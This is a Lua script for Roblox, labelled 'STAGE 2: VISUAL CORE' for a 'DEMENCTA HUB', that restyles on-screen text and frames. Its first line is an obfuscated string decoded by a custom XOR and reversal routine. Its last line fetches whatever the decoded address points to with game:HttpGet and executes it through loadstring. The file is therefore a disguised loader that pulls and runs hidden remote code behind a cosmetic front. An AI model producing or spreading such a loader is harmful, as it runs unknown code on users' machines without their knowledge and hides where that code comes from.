
--[[ STAGE 2: VISUAL CORE ]]
local _4fhBLWxZMT_DXxM5yOg6="\246\203\195\134\251\255\252\149\193\143\193\193\192\199\198\214\218\213\250\199\153\152\224\154\227\036\206\210\038\250\210\217\040\034\044\200\216\231\218\047\035\036\040\050\038\042\214\035\216\220\038\059\059\047\061\049\049\000\004\221\048\055\006\053\058\002\060\042\056\017\000\042\204\012\008\001\014\209\015\016\006\029\018\011\018\028\013\219\017\097\029\017\030\023\096\021\099\101\101\039\102\105\030\042\113\108\100\116\111\113\102\118\106\121\124\106\126\114\127\117\116\060\070\113\067\001\002\014\072\070\075\076\065"local qDS7dY7FF3vI5PLb=160 local MbQAJWtE2HBnoMAXTC=237 local d8IQdYBhWI6LYl4jyGpE9K=1 local lFPTXdA5CIrYOpU=1 local zaAFoJ8UCzghco7=7 local qnzwWizziJ7Ni=true local yGgfMim5labT3fXe1h=bit32 and bit32.bxor if not yGgfMim5labT3fXe1h then yGgfMim5labT3fXe1h=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local RQRr06rfYbwEd4sEKavK3={}for pAFIzNZHnJA6ekz=1,#_4fhBLWxZMT_DXxM5yOg6 do local CslmRAtS7VKy5s4=string.byte(_4fhBLWxZMT_DXxM5yOg6,pAFIzNZHnJA6ekz)local H8J1WAdiAprSfdp_GJwI5f=(MbQAJWtE2HBnoMAXTC+(pAFIzNZHnJA6ekz*lFPTXdA5CIrYOpU)+zaAFoJ8UCzghco7)%256 if d8IQdYBhWI6LYl4jyGpE9K==0 then CslmRAtS7VKy5s4=(CslmRAtS7VKy5s4-H8J1WAdiAprSfdp_GJwI5f)%256 RQRr06rfYbwEd4sEKavK3[pAFIzNZHnJA6ekz]=string.char(yGgfMim5labT3fXe1h(CslmRAtS7VKy5s4,qDS7dY7FF3vI5PLb))else CslmRAtS7VKy5s4=yGgfMim5labT3fXe1h(CslmRAtS7VKy5s4,qDS7dY7FF3vI5PLb)RQRr06rfYbwEd4sEKavK3[pAFIzNZHnJA6ekz]=string.char((CslmRAtS7VKy5s4-H8J1WAdiAprSfdp_GJwI5f)%256)end end local Ng_5HtxMNNXLQi=table.concat(RQRr06rfYbwEd4sEKavK3)if qnzwWizziJ7Ni then Ng_5HtxMNNXLQi=string.reverse(Ng_5HtxMNNXLQi)end local aBR8AaLI2UPRshCsqcu_f=Ng_5HtxMNNXLQi
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(aBR8AaLI2UPRshCsqcu_f))()
